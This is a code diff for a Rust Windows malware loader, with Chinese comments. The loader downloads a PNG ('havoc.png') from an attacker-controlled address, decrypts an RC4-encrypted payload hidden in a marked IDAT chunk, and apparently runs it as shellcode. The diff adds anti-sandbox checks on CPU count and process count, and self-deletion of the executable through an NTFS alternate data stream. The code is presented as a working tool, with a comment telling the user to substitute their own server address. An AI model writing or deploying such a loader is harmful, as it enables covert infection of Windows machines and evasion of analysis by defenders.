@@ -1,11 +1,25 @@
 // #![windows_subsystem = "windows"]
 use std::ptr::{null, null_mut};
+use std::ffi::c_void;
+use windows::core::PCWSTR;
 use windows::Win32::{
-    System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
+    System::{
+        Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, 
+                MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, 
+                PAGE_READWRITE,GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY},
+        SystemInformation::{GetSystemInfo, SYSTEM_INFO}},
     Globalization::{EnumSystemLocalesEx, LOCALE_ALL},
+    Foundation::CloseHandle,
+    Storage::FileSystem::{FILE_SHARE_READ, OPEN_EXISTING, SYNCHRONIZE,
+        FileDispositionInfo, FileRenameInfo, DELETE, 
+        FILE_DISPOSITION_INFO, FILE_FLAGS_AND_ATTRIBUTES,
+        CreateFileW, FILE_RENAME_INFO, 
+        SetFileInformationByHandle, 
+    },
 };
 use reqwest;
 use std::io;
+use sysinfo::System;
 
 /// 常量定义
 const RC4_KEY_SIZE: usize = 16;                 // RC4 密钥长度
@@ -13,9 +27,12 @@ const CHUNK_TYPE_SIZE: usize = 4;               // chunk 类型长度
 const BYTES_TO_SKIP: usize = 33;                // PNG 头部要跳过的字节数（签名 + IHDR）
 const PNG_SIGNATURE: u32 = 0x89504E47;          // PNG 文件签名
 const IEND_HASH: u32 = 0xAE426082;              // IEND chunk 的 CRC32 哈希
+// 复制`EmbedPayloadInPng.py`输出的MARKED_IDAT_HASH常量定义替换此处
 const MARKED_IDAT_HASH: u32 =    0x43D3839A;    // 标记 IDAT chunk 的 CRC32 哈希
 
 fn main() {
+    anti_analysis();
+
     match download_png() {
         Ok(png) => {
             println!("下载成功，数据大小: {} 字节", png.len());
@@ -91,6 +108,7 @@ fn download_png() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
 
     // 发起阻塞式 GET 请求
     let response = client
+        // 需要修改为你自己的地址
         .get("http://192.168.113.128:8001/havoc.png")
         .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         .send()?;
@@ -227,4 +245,120 @@ fn rc4_encrypt_decrypt(input: &[u8], key: &[u8]) -> Vec<u8> {
     let mut output = vec![0; input.len()];
     rc4.process(input, &mut output);
     output
+}
+
+
+fn anti_analysis() {
+    cpu_check();
+    processes_check();
+    self_deletion().unwrap();
+}
+
+fn cpu_check() {
+    let mut info = SYSTEM_INFO::default();
+    unsafe { GetSystemInfo(&mut info);}
+    if info.dwNumberOfProcessors < 2 {
+        panic!();
+        // std::process::exit(1);
+    }
+}
+
+fn processes_check() {
+    let mut system = System::new_all();
+    system.refresh_all();
+    let processes = system.processes();
+    if processes.len() < 50 {
+        panic!();
+        // std::process::exit(1);
+    }
+}
+
+// 实现程序自删除功能
+/// 通过重命名文件到备用数据流并标记删除来实现
+fn self_deletion() -> Result<(), Box<dyn std::error::Error>> {
+    // 定义要创建的备用数据流名称
+    let new_stream = ":maldev";
+    // 将数据流名称转换为 UTF-16 编码并添加结尾的 null 字符
+    let new_stream_wide = new_stream.encode_utf16().chain(Some(0)).collect::<Vec<u16>>();
+
+    unsafe {
+        // 初始化文件删除信息结构体
+        let mut delete_file = FILE_DISPOSITION_INFO::default();
+        // 计算重命名信息结构体所需的总大小（基础结构体大小 + 文件名长度）
+        let lenght = size_of::<FILE_RENAME_INFO>() + (new_stream_wide.len() * size_of::<u16>());
+        // 在堆上分配内存用于重命名信息结构体
+        let rename_info = HeapAlloc(GetProcessHeap()?, HEAP_ZERO_MEMORY, lenght) as *mut FILE_RENAME_INFO;
+
+        // 设置删除标志
+        delete_file.DeleteFile = true.into();
+        // 设置新文件名长度（减去结尾的 null 字符）
+        (*rename_info).FileNameLength = (new_stream_wide.len() * size_of::<u16>()) as u32 - 2;
+
+        // 将新的数据流名称复制到重命名信息结构体中
+        std::ptr::copy_nonoverlapping(
+            new_stream_wide.as_ptr(),
+            (*rename_info).FileName.as_mut_ptr(),
+            new_stream_wide.len(),
+        );
+
+        // 获取当前执行文件的路径
+        let path = std::env::current_exe()?;
+        let path_str = path.to_str().ok_or_else(|| "Error when converting to str")?;
+        // 将路径转换为 UTF-16 编码
+        let full_path  = path_str.encode_utf16().chain(Some(0)).collect::<Vec<u16>>();
+        
+        // 打开当前执行文件，获取文件句柄
+        // 请求删除权限和同步访问权限
+        let mut h_file = CreateFileW(
+            PCWSTR(full_path.as_ptr()),
+            DELETE.0 | SYNCHRONIZE.0,
+            FILE_SHARE_READ,              // 允许其他进程读取
+            None,                         // 默认安全属性
+            OPEN_EXISTING,                // 打开已存在的文件
+            FILE_FLAGS_AND_ATTRIBUTES(0), // 默认文件属性
+            None,                         // 无模板文件
+        )?;
+
+        // 将文件重命名到备用数据流
+        SetFileInformationByHandle(
+            h_file,
+            FileRenameInfo,              // 设置重命名信息
+            rename_info as *const c_void,
+            lenght as u32,
+        )?;
+
+        // 关闭文件句柄
+        CloseHandle(h_file)?;
+
+        // 重新打开文件以设置删除标志
+        h_file = CreateFileW(
+            PCWSTR(full_path.as_ptr()),
+            DELETE.0 | SYNCHRONIZE.0,
+            FILE_SHARE_READ,
+            None,
+            OPEN_EXISTING,
+            FILE_FLAGS_AND_ATTRIBUTES(0),
+            None,
+        )?;
+
+        // 设置文件删除标志
+        SetFileInformationByHandle(
+            h_file,
+            FileDispositionInfo,         // 设置删除信息
+            &delete_file as *const FILE_DISPOSITION_INFO as _,
+            std::mem::size_of_val(&delete_file) as u32,
+        )?;
+
+        // 关闭文件句柄
+        CloseHandle(h_file)?;
+
+        // 释放之前分配的堆内存
+        HeapFree(
+            GetProcessHeap()?,
+            HEAP_ZERO_MEMORY,
+            Some(rename_info as *const c_void),
+        )?;
+    }
+
+    Ok(())
 }
